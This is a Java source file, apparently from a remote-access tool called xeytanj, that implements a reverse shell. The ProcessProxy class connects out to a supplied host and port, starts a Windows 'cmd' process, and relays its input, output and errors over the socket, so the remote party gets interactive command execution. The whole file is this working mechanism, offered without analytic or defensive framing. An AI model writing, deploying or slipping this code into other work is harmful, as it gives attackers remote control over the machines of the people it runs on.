package com.melardev.xeytanj.net.packets;

import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.util.Iterator;
import java.util.NoSuchElementException;
import java.util.Scanner;

public class ProcessProxy extends Socket implements Runnable {

	String host;

	int port;
	String command;
	volatile boolean running;
	BufferedReader isProc;
	BufferedReader errProc;
	BufferedWriter osProc;
	BufferedReader isSock;
	PrintWriter osSock;

	public ProcessProxy(String _host, int _port, String _command) throws IOException {
		
		super(InetAddress.getByName(_host), _port);
		
		isSock = new BufferedReader(new InputStreamReader(getInputStream()));
		osSock = new PrintWriter(getOutputStream(), true);
		
		host = _host;
		port = _port;
		command = _command;
	}

	public static void main(String[] args) {
		String host = "";
		String command = "";
		int port = 0;
		if (args.length < 3) {
			host = "127.0.0.1";
			port = 3099;
			command = "cmd";
		} else {
			host = args[0];
			port = Integer.parseInt(args[1]);
			command = args[2];
		}

		ProcessProxy pp;
		try {
			pp = new ProcessProxy(host, port, command);
			Thread t = new Thread(pp, "ProcessProxyThread");
			t.setDaemon(true);
			t.start();
			pp.init();
		} catch (IOException e) {
			System.exit(0);
		}

	}

	private void init() {
		try {

			while (!running)
				Thread.sleep(200);

			try {
				Scanner scan = new Scanner(System.in);
				String userInput = "";
				String line = "";
				while (!(userInput = isSock.readLine()).equals("pProxy exit")) {
					osProc.write(userInput + "\n");
					osProc.flush();
				}
				scan.close();
			} catch (IOException e) {

			}

		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	@Override
	public void run() {
		try {
			Runtime rt = Runtime.getRuntime();
			Process proc = rt.exec("cmd");
			isProc = new BufferedReader(new InputStreamReader(proc.getInputStream()));
			osProc = new BufferedWriter(new OutputStreamWriter(proc.getOutputStream()));
			errProc = new BufferedReader(new InputStreamReader(proc.getErrorStream()));

			String line;
			char[] buffer = new char[4096];
			int charsRead;
			int count = 0;
			Thread t = new Thread(new MyRunnable(errProc), "errThread");
			t.setDaemon(true);
			t.start();
			StringBuilder sb = new StringBuilder();
			while ((charsRead = isProc.read(buffer)) != -1) {
				Thread.sleep(20); //Make the errThread print before if there is errors
				while (count < charsRead){
					sb.append(buffer[count++]);
				}
				
				osSock.write(sb.toString());
				osSock.flush();
				
				sb.setLength(0);
				count = 0;
				running = true;
			}
		} catch (IOException e) {

		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	class MyRunnable implements Runnable {

		public MyRunnable(BufferedReader __errProc) {

		}

		public void run() {
			try {
				while (true) {
					if (errProc.ready()) {
						Iterator<String> errIt;
						errIt = errProc.lines().iterator();
						try {
							while (true)
								osSock.write(errIt.next());
						} catch (NoSuchElementException e) {
							int clo = 0;
						}
					}
				}
			} catch (IOException e) {
				int callao = 2;
			}
		}
	}

}
